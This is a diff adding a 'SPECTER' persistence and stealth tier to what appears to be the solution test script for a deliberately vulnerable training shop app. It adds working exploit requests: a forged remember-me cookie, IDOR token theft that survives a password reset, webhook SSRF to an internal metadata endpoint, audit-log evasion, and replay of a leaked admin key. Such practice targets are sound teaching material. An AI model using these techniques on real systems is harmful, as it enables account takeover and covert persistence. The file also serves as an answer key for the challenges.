@@ -171,6 +171,17 @@ ok(44, 'card_data_leak', (await txt('/api/payment-methods')).body.includes('lj_s
 { const login = await (await fetch(B + '/api/login', J({ email: 'mira@leakyjuice.com', password: 'sunshine-42' }))).json();
   ok(45, 'points_rounding', (await txt('/api/points/cashout', { ...J({ points: 100, rate: 5 }), headers: { 'content-type': 'application/json', authorization: 'Bearer ' + login.token } })).body.includes('lj_points_rounding_abuse')); }
 
+// ─────────────────────── v5 SPECTER (persistence / stealth) ───────────────────────
+ok(46, 'specter_remember_me', (await txt('/api/remember/session', J({ remember: Buffer.from('1:admin').toString('base64') }))).body.includes('lj_forgeable_remember_me'));
+{ const tok = JSON.parse((await txt('/api/users/2')).body).api_token; // lift api_token via IDOR
+  await txt('/api/reset/request', J({ email: 'mira@leakyjuice.com' })); // (password churn shouldn't matter)
+  ok(47, 'specter_device_persist', (await txt('/api/device/whoami', { headers: { 'x-device-token': tok } })).body.includes('lj_token_survives_reset')); }
+{ await txt('/api/webhooks', J({ url: B + '/internal/metadata', event: 'order.created' }));
+  ok(48, 'specter_webhook_backdoor', (await txt('/api/webhooks/trigger', J({ event: 'order.created' }))).body.includes('lj_webhook_backdoor')); }
+ok(49, 'specter_audit_evasion', (await txt('/api/admin/action', J({ action: 'delete-user', silent: true }))).body.includes('lj_audit_log_evasion'));
+{ const cfg = JSON.parse((await txt('/api/config')).body); // leak the ADMIN_API_KEY
+  ok(50, 'specter_second_order', (await txt('/api/staff/tools', { headers: { 'x-support-override': cfg.ADMIN_API_KEY } })).body.includes('lj_support_override_backdoor')); }
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
